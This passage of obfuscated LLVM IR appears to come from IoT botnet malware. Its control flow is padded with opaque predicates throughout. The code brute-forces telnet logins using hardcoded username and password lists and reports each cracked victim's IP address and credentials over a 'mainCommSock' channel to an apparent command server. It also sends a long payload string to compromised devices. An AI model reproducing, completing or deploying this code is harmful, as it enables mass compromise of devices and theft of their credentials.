  store i16 %2645, i16* %2649, align 16
  %2650 = load i32, i32* @x.69
  %2651 = load i32, i32* @y.70
  %2652 = sub i32 %2650, 1
  %2653 = mul i32 %2650, %2652
  %2654 = urem i32 %2653, 2
  %2655 = icmp eq i32 %2654, 0
  %2656 = icmp slt i32 %2651, 10
  %2657 = or i1 %2655, %2656
  br i1 %2657, label %originalBBpart2269, label %originalBB267alteredBB

originalBBpart2269:                               ; preds = %originalBB267
  br label %2658

; <label>:2658:                                   ; preds = %originalBBpart2269
  %2659 = load i32, i32* @x.69
  %2660 = load i32, i32* @y.70
  %2661 = sub i32 %2659, 1
  %2662 = mul i32 %2659, %2661
  %2663 = urem i32 %2662, 2
  %2664 = icmp eq i32 %2663, 0
  %2665 = icmp slt i32 %2660, 10
  %2666 = or i1 %2664, %2665
  br i1 %2666, label %originalBB271, label %originalBB271alteredBB

originalBB271:                                    ; preds = %originalBB271alteredBB, %2658
  %2667 = load i32, i32* %2, align 4
  %2668 = sext i32 %2667 to i64
  %2669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2668
  %2670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2669, i32 0, i32 6
  %2671 = load i32, i32* %2670, align 4
  %2672 = add i32 %2671, 10
  %2673 = zext i32 %2672 to i64
  %2674 = call i64 @time(i64* null) #2
  %2675 = icmp slt i64 %2673, %2674
  %2676 = load i32, i32* @x.69
  %2677 = load i32, i32* @y.70
  %2678 = sub i32 %2676, 1
  %2679 = mul i32 %2676, %2678
  %2680 = urem i32 %2679, 2
  %2681 = icmp eq i32 %2680, 0
  %2682 = icmp slt i32 %2677, 10
  %2683 = or i1 %2681, %2682
  br i1 %2683, label %originalBBpart2276, label %originalBB271alteredBB

originalBBpart2276:                               ; preds = %originalBB271
  br i1 %2675, label %2684, label %2699

; <label>:2684:                                   ; preds = %originalBBpart2276
  %2685 = load i32, i32* %2, align 4
  %2686 = sext i32 %2685 to i64
  %2687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2686
  %2688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2687, i32 0, i32 0
  %2689 = load i32, i32* %2688, align 16
  %2690 = call i32 @sclose(i32 %2689)
  %2691 = load i32, i32* %2, align 4
  %2692 = sext i32 %2691 to i64
  %2693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2692
  %2694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2693, i32 0, i32 2
  store i8 0, i8* %2694, align 8
  %2695 = load i32, i32* %2, align 4
  %2696 = sext i32 %2695 to i64
  %2697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2696
  %2698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2697, i32 0, i32 3
  store i8 1, i8* %2698, align 1
  br label %2699

; <label>:2699:                                   ; preds = %2684, %originalBBpart2276
  %2700 = load i32, i32* @x.69
  %2701 = load i32, i32* @y.70
  %2702 = sub i32 %2700, 1
  %2703 = mul i32 %2700, %2702
  %2704 = urem i32 %2703, 2
  %2705 = icmp eq i32 %2704, 0
  %2706 = icmp slt i32 %2701, 10
  %2707 = or i1 %2705, %2706
  br i1 %2707, label %originalBB278, label %originalBB278alteredBB

originalBB278:                                    ; preds = %originalBB278alteredBB, %2699
  %2708 = load i32, i32* @x.69
  %2709 = load i32, i32* @y.70
  %2710 = sub i32 %2708, 1
  %2711 = mul i32 %2708, %2710
  %2712 = urem i32 %2711, 2
  %2713 = icmp eq i32 %2712, 0
  %2714 = icmp slt i32 %2709, 10
  %2715 = or i1 %2713, %2714
  br i1 %2715, label %originalBBpart2280, label %originalBB278alteredBB

originalBBpart2280:                               ; preds = %originalBB278
  br label %3223

; <label>:2716:                                   ; preds = %84
  %2717 = load i32, i32* %2, align 4
  %2718 = sext i32 %2717 to i64
  %2719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2718
  %2720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2719, i32 0, i32 0
  %2721 = load i32, i32* %2720, align 16
  %2722 = call i64 @send(i32 %2721, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i32 0, i32 0), i64 4, i32 16384)
  %2723 = icmp slt i64 %2722, 0
  br i1 %2723, label %2724, label %2739

; <label>:2724:                                   ; preds = %2716
  %2725 = load i32, i32* %2, align 4
  %2726 = sext i32 %2725 to i64
  %2727 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2726
  %2728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2727, i32 0, i32 0
  %2729 = load i32, i32* %2728, align 16
  %2730 = call i32 @sclose(i32 %2729)
  %2731 = load i32, i32* %2, align 4
  %2732 = sext i32 %2731 to i64
  %2733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2732
  %2734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2733, i32 0, i32 2
  store i8 0, i8* %2734, align 8
  %2735 = load i32, i32* %2, align 4
  %2736 = sext i32 %2735 to i64
  %2737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2736
  %2738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2737, i32 0, i32 3
  store i8 1, i8* %2738, align 1
  br label %3224

; <label>:2739:                                   ; preds = %2716
  %2740 = load i32, i32* %2, align 4
  %2741 = sext i32 %2740 to i64
  %2742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2741
  %2743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2742, i32 0, i32 2
  store i8 8, i8* %2743, align 8
  br label %3223

; <label>:2744:                                   ; preds = %84
  %2745 = load i32, i32* @x.69
  %2746 = load i32, i32* @y.70
  %2747 = sub i32 %2745, 1
  %2748 = mul i32 %2745, %2747
  %2749 = urem i32 %2748, 2
  %2750 = icmp eq i32 %2749, 0
  %2751 = icmp slt i32 %2746, 10
  %2752 = or i1 %2750, %2751
  br i1 %2752, label %originalBB282, label %originalBB282alteredBB

originalBB282:                                    ; preds = %originalBB282alteredBB, %2744
  %2753 = load i32, i32* %2, align 4
  %2754 = sext i32 %2753 to i64
  %2755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2754
  %2756 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2755, i32 0, i32 0
  %2757 = load i32, i32* %2756, align 16
  %2758 = call i64 @send(i32 %2757, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.80, i32 0, i32 0), i64 9, i32 16384)
  %2759 = icmp slt i64 %2758, 0
  %2760 = load i32, i32* @x.69
  %2761 = load i32, i32* @y.70
  %2762 = sub i32 %2760, 1
  %2763 = mul i32 %2760, %2762
  %2764 = urem i32 %2763, 2
  %2765 = icmp eq i32 %2764, 0
  %2766 = icmp slt i32 %2761, 10
  %2767 = or i1 %2765, %2766
  br i1 %2767, label %originalBBpart2284, label %originalBB282alteredBB

originalBBpart2284:                               ; preds = %originalBB282
  br i1 %2759, label %2768, label %2783

; <label>:2768:                                   ; preds = %originalBBpart2284
  %2769 = load i32, i32* %2, align 4
  %2770 = sext i32 %2769 to i64
  %2771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2770
  %2772 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2771, i32 0, i32 0
  %2773 = load i32, i32* %2772, align 16
  %2774 = call i32 @sclose(i32 %2773)
  %2775 = load i32, i32* %2, align 4
  %2776 = sext i32 %2775 to i64
  %2777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2776
  %2778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2777, i32 0, i32 2
  store i8 0, i8* %2778, align 8
  %2779 = load i32, i32* %2, align 4
  %2780 = sext i32 %2779 to i64
  %2781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2780
  %2782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2781, i32 0, i32 3
  store i8 1, i8* %2782, align 1
  br label %3224

; <label>:2783:                                   ; preds = %originalBBpart2284
  %2784 = load i32, i32* @x.69
  %2785 = load i32, i32* @y.70
  %2786 = sub i32 %2784, 1
  %2787 = mul i32 %2784, %2786
  %2788 = urem i32 %2787, 2
  %2789 = icmp eq i32 %2788, 0
  %2790 = icmp slt i32 %2785, 10
  %2791 = or i1 %2789, %2790
  br i1 %2791, label %originalBB286, label %originalBB286alteredBB

originalBB286:                                    ; preds = %originalBB286alteredBB, %2783
  %2792 = load i32, i32* %2, align 4
  %2793 = sext i32 %2792 to i64
  %2794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2793
  %2795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2794, i32 0, i32 2
  store i8 9, i8* %2795, align 8
  %2796 = load i32, i32* @x.69
  %2797 = load i32, i32* @y.70
  %2798 = sub i32 %2796, 1
  %2799 = mul i32 %2796, %2798
  %2800 = urem i32 %2799, 2
  %2801 = icmp eq i32 %2800, 0
  %2802 = icmp slt i32 %2797, 10
  %2803 = or i1 %2801, %2802
  br i1 %2803, label %originalBBpart2288, label %originalBB286alteredBB

originalBBpart2288:                               ; preds = %originalBB286
  br label %3223

; <label>:2804:                                   ; preds = %84
  %2805 = load i32, i32* @x.69
  %2806 = load i32, i32* @y.70
  %2807 = sub i32 %2805, 1
  %2808 = mul i32 %2805, %2807
  %2809 = urem i32 %2808, 2
  %2810 = icmp eq i32 %2809, 0
  %2811 = icmp slt i32 %2806, 10
  %2812 = or i1 %2810, %2811
  br i1 %2812, label %originalBB290, label %originalBB290alteredBB

originalBB290:                                    ; preds = %originalBB290alteredBB, %2804
  %2813 = load i32, i32* %2, align 4
  %2814 = sext i32 %2813 to i64
  %2815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2814
  %2816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2815, i32 0, i32 0
  %2817 = load i32, i32* %2816, align 16
  %2818 = call i64 @send(i32 %2817, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2819 = icmp slt i64 %2818, 0
  %2820 = load i32, i32* @x.69
  %2821 = load i32, i32* @y.70
  %2822 = sub i32 %2820, 1
  %2823 = mul i32 %2820, %2822
  %2824 = urem i32 %2823, 2
  %2825 = icmp eq i32 %2824, 0
  %2826 = icmp slt i32 %2821, 10
  %2827 = or i1 %2825, %2826
  br i1 %2827, label %originalBBpart2292, label %originalBB290alteredBB

originalBBpart2292:                               ; preds = %originalBB290
  br i1 %2819, label %2828, label %2843

; <label>:2828:                                   ; preds = %originalBBpart2292
  %2829 = load i32, i32* %2, align 4
  %2830 = sext i32 %2829 to i64
  %2831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2830
  %2832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2831, i32 0, i32 0
  %2833 = load i32, i32* %2832, align 16
  %2834 = call i32 @sclose(i32 %2833)
  %2835 = load i32, i32* %2, align 4
  %2836 = sext i32 %2835 to i64
  %2837 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2836
  %2838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2837, i32 0, i32 2
  store i8 0, i8* %2838, align 8
  %2839 = load i32, i32* %2, align 4
  %2840 = sext i32 %2839 to i64
  %2841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2840
  %2842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2841, i32 0, i32 3
  store i8 1, i8* %2842, align 1
  br label %3224

; <label>:2843:                                   ; preds = %originalBBpart2292
  %2844 = load i32, i32* @mainCommSock, align 4
  %2845 = load i32, i32* %2, align 4
  %2846 = sext i32 %2845 to i64
  %2847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2846
  %2848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2847, i32 0, i32 1
  %2849 = bitcast i32* %2848 to %struct.in_addr*
  %2850 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2849, i32 0, i32 0
  %2851 = load i32, i32* %2850, align 4
  %2852 = call i8* @inet_ntoa(i32 %2851) #2
  %2853 = load i32, i32* %2, align 4
  %2854 = sext i32 %2853 to i64
  %2855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2854
  %2856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2855, i32 0, i32 4
  %2857 = load i8, i8* %2856, align 2
  %2858 = zext i8 %2857 to i64
  %2859 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2858
  %2860 = load i8*, i8** %2859, align 8
  %2861 = load i32, i32* %2, align 4
  %2862 = sext i32 %2861 to i64
  %2863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2862
  %2864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2863, i32 0, i32 5
  %2865 = load i8, i8* %2864, align 1
  %2866 = zext i8 %2865 to i64
  %2867 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2866
  %2868 = load i8*, i8** %2867, align 8
  %2869 = call i32 (i32, i8*, ...) @sockprintf(i32 %2844, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %2852, i8* %2860, i8* %2868)
  %2870 = load i32, i32* %2, align 4
  %2871 = sext i32 %2870 to i64
  %2872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2871
  %2873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2872, i32 0, i32 2
  store i8 10, i8* %2873, align 8
  br label %3223

; <label>:2874:                                   ; preds = %84
  %2875 = load i32, i32* %2, align 4
  %2876 = sext i32 %2875 to i64
  %2877 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2876
  %2878 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2877, i32 0, i32 6
  %2879 = load i32, i32* %2878, align 4
  %2880 = icmp eq i32 %2879, 0
  br i1 %2880, label %2881, label %2888

; <label>:2881:                                   ; preds = %2874
  %2882 = call i64 @time(i64* null) #2
  %2883 = trunc i64 %2882 to i32
  %2884 = load i32, i32* %2, align 4
  %2885 = sext i32 %2884 to i64
  %2886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2885
  %2887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2886, i32 0, i32 6
  store i32 %2883, i32* %2887, align 4
  br label %2888

; <label>:2888:                                   ; preds = %2881, %2874
  %2889 = load i32, i32* @x.69
  %2890 = load i32, i32* @y.70
  %2891 = sub i32 %2889, 1
  %2892 = mul i32 %2889, %2891
  %2893 = urem i32 %2892, 2
  %2894 = icmp eq i32 %2893, 0
  %2895 = icmp slt i32 %2890, 10
  %2896 = or i1 %2894, %2895
  br i1 %2896, label %originalBB294, label %originalBB294alteredBB

originalBB294:                                    ; preds = %originalBB294alteredBB, %2888
  %2897 = load i32, i32* %2, align 4
  %2898 = sext i32 %2897 to i64
  %2899 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2898
  %2900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2899, i32 0, i32 0
  %2901 = load i32, i32* %2900, align 16
  %2902 = load i32, i32* %2, align 4
  %2903 = sext i32 %2902 to i64
  %2904 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2903
  %2905 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2904, i32 0, i32 8
  %2906 = load i8*, i8** %2905, align 8
  %2907 = load i32, i32* %2, align 4
  %2908 = sext i32 %2907 to i64
  %2909 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2908
  %2910 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2909, i32 0, i32 7
  %2911 = load i16, i16* %2910, align 16
  %2912 = zext i16 %2911 to i32
  %2913 = call i32 @readUntil(i32 %2901, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.77, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %2906, i32 1024, i32 %2912)
  %2914 = icmp ne i32 %2913, 0
  %2915 = load i32, i32* @x.69
  %2916 = load i32, i32* @y.70
  %2917 = sub i32 %2915, 1
  %2918 = mul i32 %2915, %2917
  %2919 = urem i32 %2918, 2
  %2920 = icmp eq i32 %2919, 0
  %2921 = icmp slt i32 %2916, 10
  %2922 = or i1 %2920, %2921
  br i1 %2922, label %originalBBpart2296, label %originalBB294alteredBB

originalBBpart2296:                               ; preds = %originalBB294
  br i1 %2914, label %2923, label %2964

; <label>:2923:                                   ; preds = %originalBBpart2296
  %2924 = load i32, i32* %2, align 4
  %2925 = sext i32 %2924 to i64
  %2926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2925
  %2927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2926, i32 0, i32 6
  store i32 0, i32* %2927, align 4
  %2928 = load i32, i32* %2, align 4
  %2929 = sext i32 %2928 to i64
  %2930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2929
  %2931 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2930, i32 0, i32 7
  store i16 0, i16* %2931, align 16
  %2932 = load i32, i32* %2, align 4
  %2933 = sext i32 %2932 to i64
  %2934 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2933
  %2935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2934, i32 0, i32 0
  %2936 = load i32, i32* %2935, align 16
  %2937 = call i64 @send(i32 %2936, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2938 = load i32, i32* @mainCommSock, align 4
  %2939 = load i32, i32* %2, align 4
  %2940 = sext i32 %2939 to i64
  %2941 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2940
  %2942 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2941, i32 0, i32 1
  %2943 = bitcast i32* %2942 to %struct.in_addr*
  %2944 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2943, i32 0, i32 0
  %2945 = load i32, i32* %2944, align 4
  %2946 = call i8* @inet_ntoa(i32 %2945) #2
  %2947 = load i32, i32* %2, align 4
  %2948 = sext i32 %2947 to i64
  %2949 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2948
  %2950 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2949, i32 0, i32 4
  %2951 = load i8, i8* %2950, align 2
  %2952 = zext i8 %2951 to i64
  %2953 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2952
  %2954 = load i8*, i8** %2953, align 8
  %2955 = load i32, i32* %2, align 4
  %2956 = sext i32 %2955 to i64
  %2957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2956
  %2958 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2957, i32 0, i32 5
  %2959 = load i8, i8* %2958, align 1
  %2960 = zext i8 %2959 to i64
  %2961 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2960
  %2962 = load i8*, i8** %2961, align 8
  %2963 = call i32 (i32, i8*, ...) @sockprintf(i32 %2938, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %2946, i8* %2954, i8* %2962)
  br label %3224

; <label>:2964:                                   ; preds = %originalBBpart2296
  %2965 = load i32, i32* %2, align 4
  %2966 = sext i32 %2965 to i64
  %2967 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2966
  %2968 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2967, i32 0, i32 0
  %2969 = load i32, i32* %2968, align 16
  %2970 = load i32, i32* %2, align 4
  %2971 = sext i32 %2970 to i64
  %2972 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2971
  %2973 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2972, i32 0, i32 8
  %2974 = load i8*, i8** %2973, align 8
  %2975 = load i32, i32* %2, align 4
  %2976 = sext i32 %2975 to i64
  %2977 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2976
  %2978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2977, i32 0, i32 7
  %2979 = load i16, i16* %2978, align 16
  %2980 = zext i16 %2979 to i32
  %2981 = call i32 @readUntil(i32 %2969, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %2974, i32 1024, i32 %2980)
  %2982 = icmp ne i32 %2981, 0
  br i1 %2982, label %2983, label %3024

; <label>:2983:                                   ; preds = %2964
  %2984 = load i32, i32* %2, align 4
  %2985 = sext i32 %2984 to i64
  %2986 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2985
  %2987 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2986, i32 0, i32 6
  store i32 0, i32* %2987, align 4
  %2988 = load i32, i32* %2, align 4
  %2989 = sext i32 %2988 to i64
  %2990 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2989
  %2991 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2990, i32 0, i32 7
  store i16 0, i16* %2991, align 16
  %2992 = load i32, i32* %2, align 4
  %2993 = sext i32 %2992 to i64
  %2994 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2993
  %2995 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2994, i32 0, i32 0
  %2996 = load i32, i32* %2995, align 16
  %2997 = call i64 @send(i32 %2996, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2998 = load i32, i32* @mainCommSock, align 4
  %2999 = load i32, i32* %2, align 4
  %3000 = sext i32 %2999 to i64
  %3001 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3000
  %3002 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3001, i32 0, i32 1
  %3003 = bitcast i32* %3002 to %struct.in_addr*
  %3004 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3003, i32 0, i32 0
  %3005 = load i32, i32* %3004, align 4
  %3006 = call i8* @inet_ntoa(i32 %3005) #2
  %3007 = load i32, i32* %2, align 4
  %3008 = sext i32 %3007 to i64
  %3009 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3008
  %3010 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3009, i32 0, i32 4
  %3011 = load i8, i8* %3010, align 2
  %3012 = zext i8 %3011 to i64
  %3013 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %3012
  %3014 = load i8*, i8** %3013, align 8
  %3015 = load i32, i32* %2, align 4
  %3016 = sext i32 %3015 to i64
  %3017 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3016
  %3018 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3017, i32 0, i32 5
  %3019 = load i8, i8* %3018, align 1
  %3020 = zext i8 %3019 to i64
  %3021 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %3020
  %3022 = load i8*, i8** %3021, align 8
  %3023 = call i32 (i32, i8*, ...) @sockprintf(i32 %2998, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %3006, i8* %3014, i8* %3022)
  br label %3224

; <label>:3024:                                   ; preds = %2964
  %3025 = load i32, i32* %2, align 4
  %3026 = sext i32 %3025 to i64
  %3027 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3026
  %3028 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3027, i32 0, i32 0
  %3029 = load i32, i32* %3028, align 16
  %3030 = load i32, i32* %2, align 4
  %3031 = sext i32 %3030 to i64
  %3032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3031
  %3033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3032, i32 0, i32 8
  %3034 = load i8*, i8** %3033, align 8
  %3035 = load i32, i32* %2, align 4
  %3036 = sext i32 %3035 to i64
  %3037 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3036
  %3038 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3037, i32 0, i32 7
  %3039 = load i16, i16* %3038, align 16
  %3040 = zext i16 %3039 to i32
  %3041 = call i32 @readUntil(i32 %3029, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %3034, i32 1024, i32 %3040)
  %3042 = icmp ne i32 %3041, 0
  br i1 %3042, label %3043, label %3103

; <label>:3043:                                   ; preds = %3024
  %3044 = load i32, i32* %2, align 4
  %3045 = sext i32 %3044 to i64
  %3046 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3045
  %3047 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3046, i32 0, i32 6
  store i32 0, i32* %3047, align 4
  %3048 = load i32, i32* %2, align 4
  %3049 = sext i32 %3048 to i64
  %3050 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3049
  %3051 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3050, i32 0, i32 7
  store i16 0, i16* %3051, align 16
  %3052 = load i32, i32* %2, align 4
  %3053 = sext i32 %3052 to i64
  %3054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3053
  %3055 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3054, i32 0, i32 0
  %3056 = load i32, i32* %3055, align 16
  %3057 = call i64 @send(i32 %3056, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %3058 = load i32, i32* @mainCommSock, align 4
  %3059 = load i32, i32* %2, align 4
  %3060 = sext i32 %3059 to i64
  %3061 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3060
  %3062 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3061, i32 0, i32 1
  %3063 = bitcast i32* %3062 to %struct.in_addr*
  %3064 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3063, i32 0, i32 0
  %3065 = load i32, i32* %3064, align 4
  %3066 = call i8* @inet_ntoa(i32 %3065) #2
  %3067 = load i32, i32* %2, align 4
  %3068 = sext i32 %3067 to i64
  %3069 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3068
  %3070 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3069, i32 0, i32 4
  %3071 = load i8, i8* %3070, align 2
  %3072 = zext i8 %3071 to i64
  %3073 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %3072
  %3074 = load i8*, i8** %3073, align 8
  %3075 = load i32, i32* %2, align 4
  %3076 = sext i32 %3075 to i64
  %3077 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3076
  %3078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3077, i32 0, i32 5
  %3079 = load i8, i8* %3078, align 1
  %3080 = zext i8 %3079 to i64
  %3081 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %3080
  %3082 = load i8*, i8** %3081, align 8
  %3083 = call i32 (i32, i8*, ...) @sockprintf(i32 %3058, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %3066, i8* %3074, i8* %3082)
  %3084 = load i32, i32* %2, align 4
  %3085 = sext i32 %3084 to i64
  %3086 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3085
  %3087 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3086, i32 0, i32 8
  %3088 = load i8*, i8** %3087, align 8
  call void @llvm.memset.p0i8.i64(i8* %3088, i8 0, i64 1024, i32 1, i1 false)
  %3089 = load i32, i32* %2, align 4
  %3090 = sext i32 %3089 to i64
  %3091 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3090
  %3092 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3091, i32 0, i32 0
  %3093 = load i32, i32* %3092, align 16
  %3094 = call i32 @sclose(i32 %3093)
  %3095 = load i32, i32* %2, align 4
  %3096 = sext i32 %3095 to i64
  %3097 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3096
  %3098 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3097, i32 0, i32 3
  store i8 1, i8* %3098, align 1
  %3099 = load i32, i32* %2, align 4
  %3100 = sext i32 %3099 to i64
  %3101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3100
  %3102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3101, i32 0, i32 2
  store i8 0, i8* %3102, align 8
  br label %3224

; <label>:3103:                                   ; preds = %3024
  %3104 = load i32, i32* %2, align 4
  %3105 = sext i32 %3104 to i64
  %3106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3105
  %3107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3106, i32 0, i32 8
  %3108 = load i8*, i8** %3107, align 8
  %3109 = call i64 @strlen(i8* %3108) #10
  %3110 = trunc i64 %3109 to i16
  %3111 = load i32, i32* %2, align 4
  %3112 = sext i32 %3111 to i64
